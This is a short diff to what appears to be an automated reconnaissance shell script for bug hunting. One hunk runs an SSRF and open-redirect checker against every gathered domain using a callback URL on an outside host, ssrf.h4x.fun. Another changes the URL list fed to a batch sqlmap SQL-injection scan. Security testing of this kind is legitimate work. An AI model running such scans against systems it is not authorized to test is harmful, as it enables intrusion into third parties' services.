@@ -523,7 +523,7 @@ mkdir -p $SAVEDIR/ssrf
 
 # check using script from Twitter
 for entry in $(cat "$SAVEDIR/all_domains.txt"); do
-    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" "$TMPDIR" $LOGDIR
+    $TOOLDIR/RR/support/ssrf_OR_Identifier.sh "$entry" "http://ssrf.h4x.fun/x/pqCLV?$entry" "$SAVEDIR/ssrf" "$TMPDIR"
     check "SSRF / OR identifier for $entry"
 done
 
@@ -551,7 +551,7 @@ print "Make dir and run sqlmap"
 mkdir -p $SAVEDIR/sqlmap/
 # Change to SQLI file!
 # TODO
-URLFILE="$SAVEDIR/recon-$todate/wayback-data/waybackurls_clean.txt"
+URLFILE="$SAVEDIR/$todate/targeted_lists/sqli.txt"
 python $TOOLDIR/sqlmap-dev/sqlmap.py --batch -m $URLFILE --random-agent -o --smart --results-file=$SAVEDIR/sqlmap/results.csv >> $SAVEDIR/sqlmap/sqlmap_log.txt
 check "Sqlmap"
 ########################################
